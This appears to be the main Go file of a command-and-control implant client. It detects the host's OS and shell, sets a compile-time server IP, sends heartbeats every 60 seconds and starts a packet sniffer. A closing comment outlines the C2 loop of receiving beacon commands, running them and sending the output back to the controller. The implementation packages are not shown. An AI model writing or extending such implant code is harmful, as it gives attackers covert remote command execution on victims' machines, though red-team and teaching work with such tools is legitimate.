package main

import (
	"fmt"
	"mesa/goclient/pkg/agent"
	"mesa/goclient/pkg/handler"
	"time"
)

var newAgent agent.Agent

func init() {
	newAgent = agent.Agent{}
	newAgent.OpSys, newAgent.ShellType, newAgent.ShellFlag = agent.DetectOS()
	newAgent.IFace = agent.GetNetAdapter(newAgent)
	newAgent.ServerIP = []byte{127, 0, 0, 1} //set to IP when compiling
	newAgent.MyIP = agent.GetMyIP()
}

func main() {
	fmt.Println(newAgent.ServerIP) //TODO remove

	agent.Setup(newAgent)

	ticker := time.NewTicker(60 * time.Second) //heartbeat ticker
	done := make(chan bool)

	go func() {
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				handler.Heartbeat(newAgent)
			}
		}
	}()

	handler.StartSniffer(newAgent)

	ticker.Stop()
	done <- true
}

/*
recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
*/
